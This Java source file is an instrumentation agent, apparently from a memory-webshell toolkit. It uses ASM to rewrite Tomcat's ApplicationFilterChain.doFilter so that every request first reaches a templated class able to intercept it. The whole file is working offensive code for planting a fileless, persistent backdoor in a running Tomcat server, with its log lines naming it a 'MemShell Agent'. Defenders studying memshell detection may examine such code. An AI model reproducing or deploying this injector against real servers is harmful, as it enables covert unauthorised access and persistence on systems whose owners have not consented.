package com.reajason.javaweb.memshell.injector.tomcat;

import org.objectweb.asm.*;

import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.Instrumentation;
import java.security.ProtectionDomain;

/**
 * @author ReaJason
 * @since 2025/3/26
 */
public class TomcatFilterChainAgentInjector implements ClassFileTransformer {
    private static final String TARGET_CLASS = "org/apache/catalina/core/ApplicationFilterChain";
    private static final String TARGET_METHOD_NAME = "doFilter";

    public static String getClassName() {
        return "{{advisorName}}";
    }

    public static void premain(String args, Instrumentation inst) throws Exception {
        launch(inst);
    }

    public static void agentmain(String args, Instrumentation inst) throws Exception {
        launch(inst);
    }

    private static void launch(Instrumentation inst) throws Exception {
        System.out.println("MemShell Agent is starting");
        inst.addTransformer(new TomcatFilterChainAgentInjector(), true);
        for (Class<?> allLoadedClass : inst.getAllLoadedClasses()) {
            String name = allLoadedClass.getName();
            if (TARGET_CLASS.replace("/", ".").equals(name)) {
                inst.retransformClasses(allLoadedClass);
                System.out.println("MemShell Agent is working at org.apache.catalina.core.ApplicationFilterChain.doFilter");
            }
        }
    }

    @Override
    @SuppressWarnings("all")
    public byte[] transform(final ClassLoader loader, String className, Class<?> classBeingRedefined,
                            ProtectionDomain protectionDomain, byte[] bytes) {
        if (TARGET_CLASS.equals(className)) {
            try {
                ClassReader cr = new ClassReader(bytes);
                ClassWriter cw = new ClassWriter(cr, ClassWriter.COMPUTE_MAXS | ClassWriter.COMPUTE_FRAMES) {
                    @Override
                    protected ClassLoader getClassLoader() {
                        return loader;
                    }
                };
                ClassVisitor cv = getClassVisitor(cw);
                cr.accept(cv, ClassReader.EXPAND_FRAMES);
                return cw.toByteArray();
            } catch (Throwable e) {
                e.printStackTrace();
            }
        }
        return bytes;
    }

    @SuppressWarnings("all")
    public static ClassVisitor getClassVisitor(ClassVisitor cv) {
        return new ClassVisitor(Opcodes.ASM9, cv) {
            @Override
            public MethodVisitor visitMethod(int access, String name, String descriptor,
                                             String signature, String[] exceptions) {
                MethodVisitor mv = super.visitMethod(access, name, descriptor, signature, exceptions);
                if (TARGET_METHOD_NAME.equals(name)) {
                    try {
                        Type[] argumentTypes = Type.getArgumentTypes(descriptor);
                        return new AgentShellMethodVisitor(mv, argumentTypes, getClassName());
                    } catch (Throwable e) {
                        e.printStackTrace();
                    }
                }
                return mv;
            }
        };
    }

    public static class AgentShellMethodVisitor extends MethodVisitor {
        private final Type[] argumentTypes;
        private final String className;

        public AgentShellMethodVisitor(MethodVisitor mv, Type[] argTypes, String className) {
            super(Opcodes.ASM9, mv);
            this.argumentTypes = argTypes;
            this.className = className;
        }

        @Override
        public void visitCode() {
            loadArgArray();
            Label tryStart = new Label();
            Label tryEnd = new Label();
            Label catchHandler = new Label();
            Label ifConditionFalse = new Label();
            Label skipCatchBlock = new Label();
            mv.visitTryCatchBlock(tryStart, tryEnd, catchHandler, "java/lang/Throwable");

            mv.visitLabel(tryStart);
            String internalClassName = className.replace('.', '/');
            mv.visitTypeInsn(Opcodes.NEW, internalClassName);
            mv.visitInsn(Opcodes.DUP);
            mv.visitMethodInsn(Opcodes.INVOKESPECIAL, internalClassName, "<init>", "()V", false);
            mv.visitInsn(Opcodes.SWAP);
            mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL,
                    "java/lang/Object",
                    "equals",
                    "(Ljava/lang/Object;)Z",
                    false);
            mv.visitJumpInsn(Opcodes.IFEQ, ifConditionFalse);
            mv.visitInsn(Opcodes.RETURN);
            mv.visitLabel(ifConditionFalse);
            mv.visitLabel(tryEnd);
            mv.visitJumpInsn(Opcodes.GOTO, skipCatchBlock);
            mv.visitLabel(catchHandler);
            mv.visitInsn(Opcodes.POP);
            mv.visitLabel(skipCatchBlock);
        }

        public void loadArgArray() {
            mv.visitIntInsn(Opcodes.SIPUSH, argumentTypes.length);
            mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Object");
            for (int i = 0; i < argumentTypes.length; i++) {
                mv.visitInsn(Opcodes.DUP);
                push(i);
                mv.visitVarInsn(argumentTypes[i].getOpcode(Opcodes.ILOAD), getArgIndex(i));
                mv.visitInsn(Type.getType(Object.class).getOpcode(Opcodes.IASTORE));
            }
        }

        @SuppressWarnings("all")
        public void push(final int value) {
            if (value >= -1 && value <= 5) {
                mv.visitInsn(Opcodes.ICONST_0 + value);
            } else if (value >= Byte.MIN_VALUE && value <= Byte.MAX_VALUE) {
                mv.visitIntInsn(Opcodes.BIPUSH, value);
            } else if (value >= Short.MIN_VALUE && value <= Short.MAX_VALUE) {
                mv.visitIntInsn(Opcodes.SIPUSH, value);
            } else {
                mv.visitLdcInsn(new Integer(value));
            }
        }

        private int getArgIndex(final int arg) {
            int index = 1;
            for (int i = 0; i < arg; i++) {
                index += argumentTypes[i].getSize();
            }
            return index;
        }
    }
}
